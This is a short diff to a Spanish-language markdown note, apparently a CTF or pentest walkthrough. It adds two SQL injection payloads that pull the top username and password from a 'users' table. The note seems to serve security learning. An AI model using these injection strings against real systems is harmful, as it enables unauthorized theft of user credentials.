@@ -103,10 +103,19 @@ en esta enumeración podemos ver que existe una tabla que se llama `users`
 ![[Pasted image 20240714132734.png]]
 
 `dumpeamos el campo users`
+```python
+'+(select top 1 username from users order by username)+'
+```
+
 ![[Pasted image 20240714133051.png]]
 
 `dumpeamos el campo password`
+```python
+'+(select top 1 password from users order by username)+'
+```
+
 ![[Pasted image 20240714133156.png]]
+
 
 
 
